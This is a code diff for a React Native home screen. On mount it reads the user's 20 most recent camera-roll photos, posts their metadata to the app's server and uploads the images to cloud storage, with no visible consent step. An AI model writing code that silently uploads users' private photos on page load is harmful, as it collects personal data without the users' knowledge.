@@ -2,7 +2,6 @@ import * as React from 'react';
 import {
   StyleSheet,
   View,
-  FlatList,
   StatusBar,
   Animated,
   CameraRoll,
@@ -19,11 +18,15 @@ import {
   SCREEN_WIDTH,
   isAndroid,
   TAB_BAR_HEIGHT,
-  colorSets,
-  randomItem,
   getRandomDate,
   curried,
   Vibration,
+  Permission,
+  Network,
+  retry3,
+  User,
+  HANDLE,
+  OSS,
 } from '../../utils';
 import MainCard from './components/MainCardWithSideTimeLine';
 import CarouselCard from './components/CarouselCard';
@@ -31,6 +34,8 @@ import ContentDetail from './pages/ContentDetail';
 import OneDay from './pages/OneDay';
 import HeaderBar from './components/HeaderBar';
 import { get } from 'lodash';
+import { switchMap, mergeMap, map, tap } from 'rxjs/operators';
+import { empty, from } from 'rxjs';
 // import { AnimatedWrapper } from '../../../re-kits/animationEasy/';
 const getGradientColors = (colors, currentIndex) => [
   colors[currentIndex],
@@ -49,16 +54,56 @@ class HomePage extends React.Component {
     this._initSubscription();
   }
   componentDidMount() {
-    CameraRoll.getPhotos({
-      // groupTypes: 'All',
-      first: 20,
-      assetType: 'Photos',
-    }).then(results => {
-      console.warn(results);
-    });
+    this._getPhotos();
   }
   componentWillUnmount() {}
-
+  _getPhotos = async () => {
+    try {
+      if (!User.isLoggedIn) {
+        return;
+      }
+      const { edges, page_info } = await CameraRoll.getPhotos({
+        // groupTypes: 'All',
+        first: 20,
+        assetType: 'Photos',
+      });
+      //"1548290754000"
+      const photos = edges.map(o => ({ ...o.node }));
+      console.warn(photos, page_info);
+      retry3(
+        Network.apiClient.post('/user/photo', {
+          user_id: User.objectId,
+          edges: photos,
+          page_info,
+        }),
+        { delayTime: 100, times: 5 },
+      )
+        .pipe(
+          map(({ data }) => data.next),
+          switchMap(next => (next ? from(photos) : empty())),
+          mergeMap(photo =>
+            from(
+              OSS.upLoadImage(
+                { path: photo.image.uri, mime: photo.type },
+                { ossPath: User.objectId },
+              ),
+            ),
+          ),
+        )
+        .subscribe(
+          HANDLE(data => {
+            console.warn(data);
+          }),
+        );
+    } catch (error) {
+      console.warn(error);
+    }
+  };
+  _pendingPermissions = () => {
+    Permission.checkPhotoPermission()
+      .then(() => {})
+      .catch(() => {});
+  };
   _setState = nextState => {
     this.props.dispatch('HOME_PAGE_SET_STATE', nextState);
   };
